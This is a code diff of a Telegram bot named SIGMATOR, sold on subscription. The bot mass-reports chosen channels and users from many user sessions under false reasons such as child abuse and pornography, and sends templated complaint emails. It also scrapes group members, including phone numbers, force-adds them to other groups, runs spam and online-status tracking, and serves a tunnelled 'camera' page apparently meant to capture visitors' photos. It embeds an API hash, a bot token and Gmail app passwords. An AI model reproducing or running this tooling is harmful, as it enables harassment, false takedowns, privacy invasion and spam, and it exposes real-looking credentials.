@@ -6,7 +6,11 @@ from threading import Thread
 from flask import Flask, request, render_template_string
 from telethon import TelegramClient, events, functions, types, Button
 from telethon.errors import FloodWaitError
+from telethon.tl.functions.users import GetFullUserRequest
+from telethon.tl.functions.channels import GetParticipantsRequest
+from telethon.tl.types import ChannelParticipantsSearch
 
+# ==================== SECURITY ====================
 SECRET_KEY = "SIGMATOR_X9"
 MASTER_ID = 7733193342
 
@@ -25,14 +29,14 @@ def dec(fp):
     except: return None
 
 def lock_all():
-    for f in [EMAILS_FILE,ADMINS_FILE,SUBSCRIBERS_FILE,PROXIES_FILE,DAILY_LIMIT_FILE]:
+    for f in [EMAILS_FILE,ADMINS_FILE,SUBSCRIBERS_FILE,PROXIES_FILE,DAILY_LIMIT_FILE,SPAM_FILE,ACTIVITY_FILE]:
         if os.path.exists(f): enc(f)
     if os.path.exists(SESSION_DIR):
         for f in os.listdir(SESSION_DIR):
             if f.endswith('.session') and not f.startswith('bot'): enc(os.path.join(SESSION_DIR,f))
 
 def unlock_all():
-    for f in [EMAILS_FILE,ADMINS_FILE,SUBSCRIBERS_FILE,PROXIES_FILE,DAILY_LIMIT_FILE]:
+    for f in [EMAILS_FILE,ADMINS_FILE,SUBSCRIBERS_FILE,PROXIES_FILE,DAILY_LIMIT_FILE,SPAM_FILE,ACTIVITY_FILE]:
         d = dec(f)
         if d:
             with open(f,'wb') as fw: fw.write(d)
@@ -43,6 +47,7 @@ def unlock_all():
                 if d:
                     with open(os.path.join(SESSION_DIR,f.replace('.enc','')),'wb') as fw: fw.write(d)
 
+# ==================== CONFIG ====================
 API_ID = 25342127
 API_HASH = '0b75a27b1ab66bd482b6d93a0989d34f'
 BOT_TOKEN = '8428206780:AAFX28ITNNv3GIUaaslSJzxVAXbUPs2CDjo'
@@ -52,6 +57,9 @@ ADMIN_CONTACT = '@AMIRALIxTAN'
 TARGET = 'target'
 TARGET_ACCOUNT = None
 is_attacking = False
+selected_report_count = 0
+use_selected_sessions = False
+selected_sessions_list = []
 
 SESSION_DIR = './sessions'
 PROXIES_FILE = './proxies.json'
@@ -59,6 +67,9 @@ ADMINS_FILE = './admins.json'
 EMAILS_FILE = './emails.json'
 SUBSCRIBERS_FILE = './subscribers.json'
 DAILY_LIMIT_FILE = './daily_limits.json'
+SPAM_FILE = './spam_control.json'
+ACTIVITY_FILE = './activity_log.json'
+MEMBERS_FILE = './scraped_members.json'
 
 session_locks = {}
 is_clock_active = False
@@ -68,12 +79,17 @@ auto_spam_task = None
 camera_link = None
 last_camera_photo = None
 flask_started = False
+bot_start_time = datetime.now()
+scraped_members = []
+scraping_active = False
 
 DAILY_REPORT_LIMIT = 40
-MIN_DELAY = 1.5
-MAX_DELAY = 3.5
+MIN_DELAY = 0.5
+MAX_DELAY = 1.5
 daily_report_counter = {}
 MAX_ADMINS = 10
+SPAM_THRESHOLD = 10
+BAN_DURATION_HOURS = 24
 
 REPORTS = {
     "scam":["This channel is completely fake and scamming users"],
@@ -85,15 +101,15 @@ REPORTS = {
 }
 
 ALL_REPORT_REASONS = [
-    (types.InputReportReasonChildAbuse(),"Child abuse content"),
-    (types.InputReportReasonViolence(),"Violent and harmful content"),
-    (types.InputReportReasonSpam(),"Spam messages"),
-    (types.InputReportReasonPornography(),"Adult and pornographic content"),
-    (types.InputReportReasonCopyright(),"Copyright infringement"),
-    (types.InputReportReasonFake(),"Fake identity / Impersonation"),
-    (types.InputReportReasonPersonalDetails(),"Sharing personal data without consent"),
-    (types.InputReportReasonIllegalDrugs(),"Illegal goods and drugs"),
-    (types.InputReportReasonOther(),"Other violations of Telegram terms"),
+    (types.InputReportReasonChildAbuse(),"Child abuse"),
+    (types.InputReportReasonViolence(),"Violence"),
+    (types.InputReportReasonSpam(),"Spam"),
+    (types.InputReportReasonPornography(),"Porn"),
+    (types.InputReportReasonCopyright(),"Copyright"),
+    (types.InputReportReasonFake(),"Fake"),
+    (types.InputReportReasonPersonalDetails(),"Personal Data"),
+    (types.InputReportReasonIllegalDrugs(),"Illegal Drugs"),
+    (types.InputReportReasonOther(),"Other"),
 ]
 
 DEFAULT_EMAILS = [
@@ -103,6 +119,97 @@ DEFAULT_EMAILS = [
     {"email":"shahrokhnasiray@gmail.com","password":"qlxn lxub dles hzux"}
 ]
 
+# ==================== SCRAPED MEMBERS ====================
+def load_members():
+    if os.path.exists(MEMBERS_FILE+'.enc'):
+        d = dec(MEMBERS_FILE)
+        if d: return json.loads(d)
+    if os.path.exists(MEMBERS_FILE):
+        with open(MEMBERS_FILE) as f: return json.load(f)
+    return []
+
+def save_members(d):
+    with open(MEMBERS_FILE,'w') as f: json.dump(d,f)
+
+# ==================== ACTIVITY LOG ====================
+def load_activity():
+    if os.path.exists(ACTIVITY_FILE+'.enc'):
+        d = dec(ACTIVITY_FILE)
+        if d: return json.loads(d)
+    if os.path.exists(ACTIVITY_FILE):
+        with open(ACTIVITY_FILE) as f: return json.load(f)
+    return {'first_messages':{}, 'online_users':{}, 'command_log':[]}
+
+def save_activity(d):
+    with open(ACTIVITY_FILE,'w') as f: json.dump(d,f)
+
+def log_activity(user_id, action, detail=""):
+    data = load_activity()
+    data['command_log'].append({
+        'user':str(user_id),
+        'action':action,
+        'detail':detail,
+        'time':datetime.now().isoformat()
+    })
+    if len(data['command_log']) > 1000:
+        data['command_log'] = data['command_log'][-500:]
+    save_activity(data)
+
+# ==================== ANTI-SPAM ====================
+def load_spam_control():
+    if os.path.exists(SPAM_FILE+'.enc'):
+        d = dec(SPAM_FILE)
+        if d: return json.loads(d)
+    if os.path.exists(SPAM_FILE):
+        with open(SPAM_FILE) as f: return json.load(f)
+    return {'users':{}, 'banned':{}}
+
+def save_spam_control(d):
+    with open(SPAM_FILE,'w') as f: json.dump(d,f)
+
+def check_spam(user_id):
+    data = load_spam_control()
+    uid = str(user_id)
+    
+    if uid in data['banned']:
+        ban_time = datetime.fromisoformat(data['banned'][uid])
+        if datetime.now() < ban_time:
+            remaining = ban_time - datetime.now()
+            hours = remaining.seconds // 3600
+            minutes = (remaining.seconds % 3600) // 60
+            return False, f"BANNED! Time remaining: {hours}h {minutes}m"
+        else:
+            del data['banned'][uid]
+            save_spam_control(data)
+    
+    if uid not in data['users']:
+        data['users'][uid] = {'count':0, 'last_reset':datetime.now().strftime('%Y-%m-%d')}
+    
+    today = datetime.now().strftime('%Y-%m-%d')
+    if data['users'][uid]['last_reset'] != today:
+        data['users'][uid] = {'count':0, 'last_reset':today}
+    
+    data['users'][uid]['count'] += 1
+    count = data['users'][uid]['count']
+    
+    if count >= SPAM_THRESHOLD:
+        ban_until = datetime.now() + timedelta(hours=BAN_DURATION_HOURS)
+        data['banned'][uid] = ban_until.isoformat()
+        save_spam_control(data)
+        return False, f"BANNED for {BAN_DURATION_HOURS}h! Too many requests ({count})"
+    
+    if count >= SPAM_THRESHOLD - 3:
+        save_spam_control(data)
+        return True, f"WARNING! Only {SPAM_THRESHOLD - count} requests left before BAN. Slow down!"
+    
+    if count >= SPAM_THRESHOLD - 5:
+        save_spam_control(data)
+        return True, f"Please work more slowly. ({SPAM_THRESHOLD - count} requests remaining)"
+    
+    save_spam_control(data)
+    return True, None
+
+# ==================== DAILY LIMIT ====================
 def load_daily_limits():
     if os.path.exists(DAILY_LIMIT_FILE+'.enc'):
         d = dec(DAILY_LIMIT_FILE)
@@ -124,6 +231,7 @@ def check_daily_limit():
 def increment_daily_counter(rc=0,ec=0):
     d = load_daily_limits(); d['reports']+=rc; d['emails']+=ec; save_daily_limits(d)
 
+# ==================== GEMINI AI ====================
 def ai(prompt):
     url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
     try:
@@ -139,21 +247,19 @@ def clean_name(t):
 
 def ai_channel(ch):
     c = ch.replace('https://t.me/','').replace('@','').strip()
-    p = f"""Extract impersonated entity: "{c}"
-Remove filler words. Split CamelCase. Return ONLY name.
-Examples: "JohnnyDepp_Official"→"Johnny Depp" "OKX_Support"→"OKX Exchange"
-Name:"""
+    p = f"Extract impersonated entity from: {c}. Remove filler words. Return ONLY name."
     r = ai(p)
-    return clean_name(r.replace('"','').replace("'","")) if r else clean_name(c)
+    return clean_name(r) if r else clean_name(c)
 
 def ai_scan(ch,posts):
-    p = f"Analyze posts from {ch}: {posts[:2000]}\nReturn JSON: {{\"accounts\":[],\"links\":[],\"phones\":[],\"scam_description\":\"\"}}"
+    p = f"Analyze posts from {ch}: {posts[:2000]}\nReturn JSON: accounts,links,phones,scam_description"
     r = ai(p)
     try:
         if r: return json.loads(r.replace('```json','').replace('```','').strip())
     except: pass
     return {"accounts":[],"links":[],"phones":[],"scam_description":"scam"}
 
+# ==================== SCANNER ====================
 async def scan_channel(ch):
     try:
         client = TelegramClient('scan_tmp',API_ID,API_HASH)
@@ -176,6 +282,223 @@ async def scan_channel(ch):
         return {'accounts':list(set(ma+ai_info.get('accounts',[]))),'links':list(set(ml+ai_info.get('links',[]))),'phones':list(set(mp+ai_info.get('phones',[]))),'scam_description':ai_info.get('scam_description','fraud')}
     except: return {'accounts':[],'links':[],'phones':[],'scam_description':'unknown'}
 
+# ==================== SCRAPE MEMBERS ====================
+async def scrape_members_worker(session_path, target_group):
+    try:
+        client = TelegramClient(session_path, API_ID, API_HASH)
+        await client.connect()
+        if not await client.is_user_authorized():
+            await client.disconnect()
+            return []
+        
+        c = target_group.replace('https://t.me/','').replace('@','').strip()
+        entity = await client.get_entity(c)
+        
+        members = []
+        offset = 0
+        limit = 200
+        
+        while True:
+            try:
+                participants = await client(GetParticipantsRequest(
+                    channel=entity,
+                    filter=ChannelParticipantsSearch(''),
+                    offset=offset,
+                    limit=limit,
+                    hash=0
+                ))
+                
+                if not participants.users:
+                    break
+                
+                for user in participants.users:
+                    members.append({
+                        'id': user.id,
+                        'username': user.username or '',
+                        'first_name': user.first_name or '',
+                        'last_name': user.last_name or '',
+                        'phone': getattr(user, 'phone', None),
+                        'access_hash': str(getattr(user, 'access_hash', ''))
+                    })
+                
+                offset += len(participants.users)
+                
+                if len(participants.users) < limit:
+                    break
+                
+                await asyncio.sleep(random.uniform(1, 2))
+                
+            except FloodWaitError as e:
+                await asyncio.sleep(e.seconds + 5)
+            except:
+                break
+        
+        await client.disconnect()
+        return members
+        
+    except Exception as e:
+        return []
+
+async def run_scrape_members(bot, cid, mid):
+    global scraping_active, scraped_members
+    
+    if TARGET == 'target':
+        await bot.edit_message(cid, mid, "Set target group first!")
+        return
+    
+    scraping_active = True
+    all_members = []
+    sessions = get_sessions()
+    
+    if not sessions:
+        await bot.edit_message(cid, mid, "No sessions available!")
+        return
+    
+    await bot.edit_message(cid, mid, f"Scraping members from: {TARGET}\n\nUsing {len(sessions)} sessions...")
+    
+    for idx, s in enumerate(sessions, 1):
+        if not scraping_active:
+            break
+        
+        try:
+            await bot.edit_message(cid, mid, f"Scraping... Session {idx}/{len(sessions)}\nMembers found: {len(all_members)}")
+        except:
+            pass
+        
+        members = await scrape_members_worker(s, TARGET)
+        all_members.extend(members)
+        await asyncio.sleep(random.uniform(2, 4))
+    
+    # Remove duplicates
+    seen_ids = set()
+    unique_members = []
+    for m in all_members:
+        if m['id'] not in seen_ids:
+            seen_ids.add(m['id'])
+            unique_members.append(m)
+    
+    scraped_members = unique_members
+    save_members(unique_members)
+    scraping_active = False
+    
+    await bot.edit_message(cid, mid, f"SCRAPE COMPLETE!\n\nTotal members scraped: {len(unique_members)}\n\nSaved to scraped_members.json")
+
+# ==================== ADD MEMBERS ====================
+async def add_members_worker(session_path, target_group, members_to_add):
+    try:
+        client = TelegramClient(session_path, API_ID, API_HASH)
+        await client.connect()
+        if not await client.is_user_authorized():
+            await client.disconnect()
+            return 0
+        
+        c = target_group.replace('https://t.me/','').replace('@','').strip()
+        entity = await client.get_entity(c)
+        
+        added = 0
+        for member in members_to_add[:50]:  # Limit per session
+            try:
+                user_entity = await client.get_input_entity(member['id'])
+                await client(functions.channels.InviteToChannelRequest(
+                    channel=entity,
+                    users=[user_entity]
+                ))
+                added += 1
+                await asyncio.sleep(random.uniform(3, 6))
+            except FloodWaitError as e:
+                await asyncio.sleep(e.seconds + 5)
+            except:
+                pass
+        
+        await client.disconnect()
+        return added
+        
+    except Exception as e:
+        return 0
+
+async def run_add_members(bot, cid, mid, target_group, count):
+    global scraped_members
+    
+    if not scraped_members:
+        scraped_members = load_members()
+    
+    if not scraped_members:
+        await bot.edit_message(cid, mid, "No scraped members! Scrape first.")
+        return
+    
+    sessions = get_sessions()
+    members_to_add = scraped_members[:count]
+    total_added = 0
+    
+    await bot.edit_message(cid, mid, f"Adding {len(members_to_add)} members to: {target_group}\n\nUsing {len(sessions)} sessions...")
+    
+    for idx, s in enumerate(sessions, 1):
+        chunk = members_to_add[idx*50:(idx+1)*50] if idx*50 < len(members_to_add) else members_to_add[idx*50:]
+        if not chunk:
+            break
+        
+        added = await add_members_worker(s, target_group, chunk)
+        total_added += added
+        
+        try:
+            await bot.edit_message(cid, mid, f"Adding members... Session {idx}/{len(sessions)}\nAdded: {total_added}")
+        except:
+            pass
+        
+        await asyncio.sleep(random.uniform(2, 4))
+    
+    await bot.edit_message(cid, mid, f"ADD COMPLETE!\n\nTotal added: {total_added}/{len(members_to_add)}")
+
+# ==================== FIRST MESSAGE FINDER ====================
+async def find_first_message(channel):
+    try:
+        client = TelegramClient('first_msg',API_ID,API_HASH)
+        await client.start(bot_token=BOT_TOKEN)
+        c = channel.replace('https://t.me/','').replace('@','').strip()
+        entity = await client.get_entity(c)
+        messages = await client.get_messages(entity, limit=1, offset_id=1)
+        if messages and len(messages) > 0:
+            msg = messages[0]
+            result = f"First message in {c}:\nDate: {msg.date}\nText: {msg.text[:200] if msg.text else 'No text'}"
+        else:
+            result = f"No messages found in {c}"
+        await client.disconnect()
+        return result
+    except Exception as e:
+        return f"Error: {str(e)[:100]}"
+
+# ==================== ONLINE CHECKER ====================
+async def check_user_online(username):
+    try:
+        client = TelegramClient('online_chk',API_ID,API_HASH)
+        await client.start(bot_token=BOT_TOKEN)
+        u = username.replace('@','').strip()
+        entity = await client.get_entity(u)
+        full = await client(GetFullUserRequest(entity))
+        user = full.users[0]
+        status = user.status
+        if hasattr(status, 'was_online'):
+            last_online = status.was_online
+            now = datetime.now(last_online.tzinfo)
+            diff = now - last_online
+            if diff.seconds < 60:
+                result = f"{u}: Online (last seen just now)"
+            elif diff.seconds < 3600:
+                result = f"{u}: Last seen {diff.seconds//60} minutes ago"
+            elif diff.days < 1:
+                result = f"{u}: Last seen {diff.seconds//3600} hours ago"
+            else:
+                result = f"{u}: Last seen {diff.days} days ago"
+        elif hasattr(status, 'expires'):
+            result = f"{u}: Premium (hidden last seen)"
+        else:
+            result = f"{u}: Status unknown"
+        await client.disconnect()
+        return result
+    except Exception as e:
+        return f"Error checking {username}: {str(e)[:100]}"
+
+# ==================== SUBSCRIPTION ====================
 SUB_PLANS = {
     "free":{"sessions":5,"days":7,"name":"Free 7 Days","price":"Free"},
     "7days":{"sessions":20,"days":7,"name":"7 Days","price":"50k Toman"},
@@ -211,6 +534,7 @@ def add_subscription(uid,plan):
     subscribers[uid] = {'plan':plan,'sessions':p['sessions'],'expiry':(datetime.now()+timedelta(days=p['days'])).isoformat(),'added':datetime.now().isoformat(),'pending':False}
     save_subscribers(subscribers)
 
+# ==================== ADMIN ====================
 def load_admins():
     if os.path.exists(ADMINS_FILE+'.enc'):
         d = dec(ADMINS_FILE)
@@ -237,6 +561,7 @@ def remove_admin(uid):
     admins.remove(uid); save_admins(admins)
     return True,f"Removed! ({len(admins)}/{MAX_ADMINS})"
 
+# ==================== PROXY ====================
 def load_proxies():
     if os.path.exists(PROXIES_FILE+'.enc'):
         d = dec(PROXIES_FILE)
@@ -264,6 +589,7 @@ def patch_session_db(sp):
 def create_stable_client(sp):
     return TelegramClient(sp,API_ID,API_HASH,timeout=60,connection_retries=5,auto_reconnect=True)
 
+# ==================== REPORT WORKER ====================
 async def report_worker(sp,tc,reason,msg):
     patch_session_db(sp)
     sn = os.path.basename(sp)
@@ -286,6 +612,7 @@ async def report_worker(sp,tc,reason,msg):
             try: await client.disconnect()
             except: pass
 
+# ==================== FAST PYROGRAM ====================
 async def fast_pyrogram_worker(sp,tc):
     patch_session_db(sp)
     sn = os.path.basename(sp)
@@ -300,8 +627,7 @@ async def fast_pyrogram_worker(sp,tc):
             await client(functions.account.ReportPeerRequest(peer=te,reason=types.InputReportReasonSpam(),message="Spam"))
             daily_report_counter[sn] = daily_report_counter.get(sn,0)+1
             return "reported_1"
-        except FloodWaitError as e:
-            await asyncio.sleep(e.seconds+5); return "failed"
+        except FloodWaitError as e: await asyncio.sleep(e.seconds+5); return "failed"
         except: return "failed"
         finally:
             try: await client.disconnect()
@@ -318,13 +644,14 @@ async def run_fast_pyrogram(bot,cid,mid):
         res = await fast_pyrogram_worker(s,TARGET)
         if res=="reported_1": ok+=1
         else: fail+=1
-        if idx%3==0 or idx==len(sessions):
-            try: await bot.edit_message(cid,mid,f"FAST PYROGRAM\n\n{idx}/{len(sessions)}\nSuccess: {ok} | Failed: {fail}")
+        if idx%3==0:
+            try: await bot.edit_message(cid,mid,f"FAST PYROGRAM\n{idx}/{len(sessions)}\nSuccess: {ok} | Failed: {fail}")
             except: pass
         await asyncio.sleep(1.0)
     is_attacking = False
-    await bot.edit_message(cid,mid,f"FAST PYROGRAM DONE!\n\nSuccess: {ok}\nFailed: {fail}")
+    await bot.edit_message(cid,mid,f"FAST PYROGRAM DONE!\nSuccess: {ok}\nFailed: {fail}")
 
+# ==================== JOIN ====================
 async def join_worker(sp,tl):
     patch_session_db(sp)
     sn = os.path.basename(sp)
@@ -342,9 +669,8 @@ async def join_worker(sp,tl):
                 return "joined"
         except FloodWaitError as e: await asyncio.sleep(e.seconds+2); return "flood"
         except Exception as e:
-            err = str(e).lower()
-            if "already" in err: return "already"
-            if "too many" in err: return "limited"
+            if "already" in str(e).lower(): return "already"
+            if "too many" in str(e).lower(): return "limited"
             return "failed"
         finally:
             try: await client.disconnect()
@@ -368,8 +694,9 @@ async def run_join_group(bot,cid,mid):
         except: pass
         await asyncio.sleep(random.uniform(2.0,4.0))
     is_attacking = False
-    await bot.edit_message(cid,mid,f"ch/gp join COMPLETE!\n\nJoined: {ok}\nFailed: {fail}\nAlready: {already}\nLimited: {limited}")
+    await bot.edit_message(cid,mid,f"JOIN COMPLETE!\nJoined: {ok}\nFailed: {fail}")
 
+# ==================== GROUP REPORT ====================
 async def group_report_worker(sp,gl,sr):
     patch_session_db(sp)
     sn = os.path.basename(sp)
@@ -404,15 +731,17 @@ async def run_group_report(bot,cid,mid,sr):
     ok,fail,total = 0,0,0
     for idx,s in enumerate(sessions,1):
         if not is_attacking: break
-        try: await bot.edit_message(cid,mid,f"GROUP REPORT\n\n{idx}/{len(sessions)}\nSuccess: {ok}\nFailed: {fail}\nTotal: {total}")
-        except: pass
         res = await group_report_worker(s,TARGET,sr)
         if res.startswith("reported"): ok+=1; total+=int(res.split("_")[1])
         else: fail+=1
+        if idx%3==0:
+            try: await bot.edit_message(cid,mid,f"GROUP REPORT\n{idx}/{len(sessions)}\nSuccess: {ok}")
+            except: pass
         await asyncio.sleep(random.uniform(3.0,6.0))
     is_attacking = False
-    await bot.edit_message(cid,mid,f"GROUP REPORT DONE!\n\nSuccess: {ok}\nFailed: {fail}\nTotal: {total}")
+    await bot.edit_message(cid,mid,f"GROUP REPORT DONE!\nSuccess: {ok}\nTotal: {total}")
 
+# ==================== WORKERS ====================
 async def send_msg_worker(sp,tu,mt):
     patch_session_db(sp)
     sn = os.path.basename(sp)
@@ -423,7 +752,6 @@ async def send_msg_worker(sp,tu,mt):
             await client.connect()
             if not await client.is_user_authorized(): return "unauthorized"
             await client.send_message(tu,mt); return "success"
-        except FloodWaitError as e: await asyncio.sleep(e.seconds+2); return "flood"
         except: return "failed"
         finally:
             try: await client.disconnect()
@@ -441,7 +769,6 @@ async def leave_worker(sp,tl):
             t = tl.replace('@','').strip()
             await client(functions.channels.LeaveChannelRequest(channel=await client.get_entity(t)))
             return "left"
-        except FloodWaitError as e: await asyncio.sleep(e.seconds+2); return "flood"
         except: return "failed"
         finally:
             try: await client.disconnect()
@@ -471,6 +798,7 @@ async def reaction_worker(sp,tc,emojies):
             try: await client.disconnect()
             except: pass
 
+# ==================== CLOCK ====================
 async def clock_task_func(client):
     global is_clock_active
     last = ""
@@ -490,6 +818,7 @@ async def clock_task_func(client):
             if client.is_connected(): await client.disconnect()
         except: pass
 
+# ==================== AUTO SPAM ====================
 async def auto_spam_worker(client,group,message,interval):
     global is_auto_spam_active
     try:
@@ -503,6 +832,7 @@ async def auto_spam_worker(client,group,message,interval):
             if client.is_connected(): await client.disconnect()
         except: pass
 
+# ==================== CAMERA ====================
 app = Flask(__name__)
 HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Cam</title></head>
 <body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-size:20px;">
@@ -546,6 +876,7 @@ def start_camera():
         if 'https://' in line: camera_link = line.strip(); return camera_link
     return None
 
+# ==================== EMAIL ====================
 def load_emails():
     if os.path.exists(EMAILS_FILE+'.enc'):
         d = dec(EMAILS_FILE)
@@ -575,10 +906,8 @@ def gen_email(mode,ch,acc,scan,imp):
 
 I am writing to report a fraudulent Telegram channel actively impersonating {imp}.
 
-FRAUDULENT CHANNEL:
-- Channel: {ch}
-- Associated Account: {acc or 'Multiple linked accounts'}
-- Impersonating: {imp}
+FRAUDULENT CHANNEL: {ch}
+IMPERSONATING: {imp}
 
 This channel is scamming users by pretending to be {imp}.
 
@@ -669,10 +998,11 @@ A Rights Holder"""),
     }
     t = T.get(mode,T['scam']); return t[0],t[1]
 
+# ==================== SMART ATTACK ====================
 async def smart_attack(bot,cid,mid,mode):
-    global TARGET,TARGET_ACCOUNT,is_attacking
+    global TARGET,TARGET_ACCOUNT,is_attacking,selected_report_count,use_selected_sessions,selected_sessions_list
     cr,ce,rr,re = check_daily_limit()
-    if not cr and not ce: await bot.edit_message(cid,mid,f"DAILY LIMIT REACHED!\n\n{DAILY_REPORT_LIMIT}/{DAILY_REPORT_LIMIT}"); return
+    if not cr and not ce: await bot.edit_message(cid,mid,f"DAILY LIMIT REACHED!\n{DAILY_REPORT_LIMIT}/{DAILY_REPORT_LIMIT}"); return
     if TARGET=='target': await bot.edit_message(cid,mid,"Set target first!"); return
     is_attacking = True; rs,es = 0,0
     
@@ -681,21 +1011,27 @@ async def smart_attack(bot,cid,mid,mode):
     await bot.edit_message(cid,mid,f"AI: {imp}\n\nScanning posts...")
     scan = await scan_channel(TARGET)
     ac = scan.get('accounts',[]); lk = scan.get('links',[])
-    await bot.edit_message(cid,mid,f"TARGET: {TARGET}\nIMPERSONATING: {imp}\nAccounts: {len(ac)}\nLinks: {len(lk)}\n\nStarting reports & emails...")
+    
+    sessions = get_sessions()
+    if use_selected_sessions and selected_sessions_list:
+        sessions = [s for s in sessions if os.path.basename(s) in selected_sessions_list]
+    if selected_report_count > 0:
+        sessions = sessions[:selected_report_count]
+    
+    await bot.edit_message(cid,mid,f"TARGET: {TARGET}\nIMPERSONATING: {imp}\nAccounts: {len(ac)}\nSessions: {len(sessions)}\n\nStarting reports & emails...")
     
     if cr:
         reasons = {"scam":types.InputReportReasonSpam(),"porn":types.InputReportReasonPornography(),"violence":types.InputReportReasonViolence(),"child":types.InputReportReasonChildAbuse(),"copyright":types.InputReportReasonCopyright(),"fake":types.InputReportReasonFake()}
         reason = reasons.get(mode,types.InputReportReasonSpam())
-        sessions = get_sessions()
         use = sessions[:rr] if len(sessions)>rr else sessions
         for idx,s in enumerate(use,1):
             if not is_attacking: break
-            res = await report_worker(s,TARGET.replace('@','').strip(),reason,f"{mode} report")
+            res = await report_worker(s,TARGET.replace('@','').strip(),reason,f"{mode}")
             if res==1: rs+=1
             if idx%5==0:
                 try: await bot.edit_message(cid,mid,f"Reports: {rs}/{len(use)}\nEmails: {es}")
                 except: pass
-            await asyncio.sleep(random.uniform(1.0,2.0))
+            await asyncio.sleep(random.uniform(0.5,1.5))
     
     if ce:
         subj,body = gen_email(mode,TARGET,TARGET_ACCOUNT,scan,imp)
@@ -713,156 +1049,109 @@ async def smart_attack(bot,cid,mid,mode):
             await asyncio.sleep(random.uniform(2.0,4.0))
     
     increment_daily_counter(rs,es); is_attacking = False
-    final = f"ATTACK COMPLETE\n\nMode: {mode.upper()}\nTarget: {TARGET}\nImpersonating: {imp}\n\nReports sent: {rs}\nEmails sent: {es}\n\nDaily remaining: {rr-rs} reports"
-    if ac: final += "\n\nDetected accounts:\n"+'\n'.join([f'  - @{a}' for a in ac[:5]])
+    total_ac = len(sessions); success_rate = (rs/total_ac*100) if total_ac>0 else 0
+    
+    final = f"ATTACK COMPLETE\n\nMode: {mode.upper()}\nTarget: {TARGET}\nImpersonating: {imp}\n\nAccounts: {rs}/{total_ac}\nSuccess: {success_rate:.1f}%\nReports: {rs}\nEmails: {es}\n\nDaily left: {rr-rs}"
+    if ac: final += "\n\nDetected:\n"+'\n'.join([f'  - @{a}' for a in ac[:5]])
     await bot.edit_message(cid,mid,final)
 
+# ==================== PANEL ====================
+async def show_panel(e):
+    cid = e.chat_id; mid = e.message_id; uid = e.sender_id
+    sessions = get_sessions()
+    emails = load_emails()
+    members = load_members()
+    uptime = datetime.now() - bot_start_time
+    days = uptime.days; hours = uptime.seconds//3600; minutes = (uptime.seconds%3600)//60
+    cr,ce,rr,re = check_daily_limit()
+    
+    text = f"""SIGMATOR CONTROL PANEL
+========================
+Uptime: {days}d {hours}h {minutes}m
+Sessions: {len(sessions)}
+Emails: {len(emails)}
+Scraped Members: {len(members)}
+Daily: {DAILY_REPORT_LIMIT-rr}/{DAILY_REPORT_LIMIT}
+Target: {TARGET}
+Status: {'RUNNING' if is_attacking else 'IDLE'}
+========================
+
+SELECT SESSIONS:
+Total: {len(sessions)} | Selected: {selected_report_count if selected_report_count>0 else 'ALL'}"""
+    
+    btns = [
+        [Button.inline("Select 5 sessions",b"sel_5"), Button.inline("Select 10",b"sel_10")],
+        [Button.inline("Select 20 sessions",b"sel_20"), Button.inline("Select ALL",b"sel_all")],
+        [Button.inline("SCRAPE MEMBERS",b"scrape_members")],
+        [Button.inline("ADD MEMBERS",b"add_members_menu")],
+        [Button.inline("FIRST MSG FINDER",b"first_msg")],
+        [Button.inline("CHECK ONLINE",b"check_online")],
+        [Button.inline("Back to Menu",b"back")],
+    ]
+    
+    await e.client.edit_message(cid,mid,text,buttons=btns)
+
+# ==================== MENU ====================
 async def get_menu(uid=None):
-    global is_clock_active,is_auto_spam_active
+    global is_clock_active,is_auto_spam_active,selected_report_count
     is_admin = uid in ADMINS if uid else False
     sub = get_user_sub(uid) if uid and not is_admin else None
     has_sub = sub is not None and not sub.get('pending',False)
     cr,ce,rr,_ = check_daily_limit()
     
     if uid and not is_admin and not has_sub:
-        if sub and sub.get('pending'):
-            txt = f"SIGMATOR BOT\n\nPENDING ACTIVATION\n\nAdd {sub['sessions']} accounts to activate.\nProgress: {len(get_sessions())}/{sub['sessions']}\n\nUse /add to add accounts.\nContact: {ADMIN_CONTACT}"
-            btns = [[Button.inline("Check Progress",b"sub_status")]]
-        else:
-            txt = f"SIGMATOR BOT\n\nACCESS DENIED\n\nFree 7 Days - 5 accounts\nPremium - Contact {ADMIN_CONTACT}\n\nCommands:\n/subscribe | /add | /status"
-            btns = [[Button.inline("Activate Free",b"sub_free")],[Button.inline("Buy Premium",b"sub_buy")],[Button.inline("My Status",b"sub_status")]]
+        txt = f"SIGMATOR BOT\n\nACCESS DENIED\n\nContact: {ADMIN_CONTACT}"
+        btns = [[Button.inline("Activate Free",b"sub_free")],[Button.inline("Buy Premium",b"sub_buy")]]
         return txt,btns
     
     txt = f"""SIGMATOR BOT
 ================
 Target: {TARGET}
-Sessions: {len(get_sessions())}
-Proxies: {len(load_proxies())}
-Emails: {len(load_emails())}
+Sessions: {len(get_sessions())} | Selected: {selected_report_count if selected_report_count>0 else 'ALL'}
+Emails: {len(load_emails())} | Members: {len(load_members())}
 Daily: {DAILY_REPORT_LIMIT-rr}/{DAILY_REPORT_LIMIT}
 Clock: {'ON' if is_clock_active else 'OFF'}
-Spam: {'ON' if is_auto_spam_active else 'OFF'}
 Status: {'RUNNING' if is_attacking else 'IDLE'}
 ================"""
     
     if not cr and not ce:
         btns = [
             [Button.inline("DAILY LIMIT REACHED",b"limit_info")],
-            [Button.inline("SET TARGET",b"set"),Button.inline("MONITOR",b"monit")],
-            [Button.inline(f"CLOCK {'ON' if is_clock_active else 'OFF'}",b"clock_menu")],
-            [Button.inline("SEND MSG",b"msg_menu")],
-            [Button.inline("LEAVE",b"leave_ch"),Button.inline("REACT +",b"react_pos")],
-            [Button.inline("REACT -",b"react_neg")],
-            [Button.inline("PROXY",b"proxy_main"),Button.inline("EMAIL",b"email_menu")],
-            [Button.inline(f"SPAM ({'ON' if is_auto_spam_active else 'OFF'})",b"auto_spam_menu")],
-            [Button.inline("CAMERA",b"camera_menu")],
-            [Button.inline("PING",b"ping"),Button.inline("STOP",b"stop")],
+            [Button.inline("SET TARGET",b"set"),Button.inline("PANEL",b"panel")],
+            [Button.inline("STOP",b"stop")],
         ]
     else:
         btns = [
             [Button.inline("SCAM + REPORT + EMAIL",b"a_scam")],
             [Button.inline("FAKE + REPORT + EMAIL",b"a_fake")],
-            [Button.inline("CHILD ABUSE + REPORT + EMAIL",b"a_child")],
+            [Button.inline("CHILD + REPORT + EMAIL",b"a_child")],
             [Button.inline("PORN + REPORT + EMAIL",b"a_porn")],
             [Button.inline("VIOLENCE + REPORT + EMAIL",b"a_violence")],
